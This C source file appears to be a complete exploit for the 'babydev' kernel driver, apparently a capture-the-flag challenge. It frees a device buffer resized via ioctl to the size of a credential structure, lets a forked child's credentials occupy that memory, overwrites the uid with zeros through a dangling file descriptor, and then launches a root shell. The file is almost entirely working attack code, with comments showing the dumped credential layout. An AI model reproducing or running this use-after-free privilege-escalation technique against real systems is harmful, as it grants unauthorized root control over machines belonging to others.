#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>


#define DEBUG(fmt, ...) \
	do { fprintf(stderr, "[!] " fmt "\n", __VA_ARGS__); } while (0)

void print_buf(size_t *buf, size_t len) {
	int i = 0;
	for ( i = 0; i < (len/sizeof(size_t *)); i++) {
		DEBUG("off:%d val:0x%lx", i, buf[i]);
	}
	return;
}


int main() {
	int fd1 = open("/dev/babydev", O_RDWR);
	if ( fd1 == -1 ) {
		perror("open");
		return 1;
	}

	DEBUG("Opened file /dev/babydev @ fd1 %d", fd1);

	int fd2 = open("/dev/babydev", O_RDWR);
	if ( fd2 == -1 ) {
		perror("open");
		return 1;
	}

	DEBUG("Opened file /dev/babydev @ fd2 %d", fd2);

	/*
	char buf[64];
	int ret = read(fd1, buf, 63);
	DEBUG("Got %d bytes from fd1", ret);
	print_buf(buf, 64);

	ret = read(fd2, buf, 63);
	DEBUG("Got %d bytes from fd2", ret);
	print_buf(buf, 64);
	*/

	int ret = ioctl(fd1, 65537, 0xa8);
	if ( ret != 0 ) {
		perror("ioctl");
		return 1;
	}

	close(fd1);

	int pid = fork();
	if ( pid < 0 ) {
		perror("fork");
		return 1;
	} else if ( pid == 0 ) {
		DEBUG("Fork complete : %d", getpid());
		DEBUG("Current uid : %d", getuid());
		/*
		char buf[0xa8];
		int ret = read(fd2, buf, 0xa7);
		DEBUG("Got %d bytes from fd2", ret);
		print_buf(buf, 0xa7);
		*/

		/*
		 * Cred structure
		 * [!] off:0 val:0x3e800000002
		 * [!] off:1 val:0x3e8000003e8
		 * [!] off:2 val:0x3e8000003e8
		 * [!] off:3 val:0x3e8000003e8
		 * [!] off:4 val:0x3e8
		 * [!] off:5 val:0x0
		 * [!] off:6 val:0x0
		 */
		int buf[9] = {0};
		buf[0] = 2;
		int ret = write(fd2, buf, 9*sizeof(int));
		DEBUG("Wrote %d bytes to fd2", ret);
		DEBUG("New uid : %d", getuid());
		if ( getuid() == 0) {
			system("/bin/sh");
			exit(0);
		}
	} else {
		wait(NULL);
	}

	return 0;
}
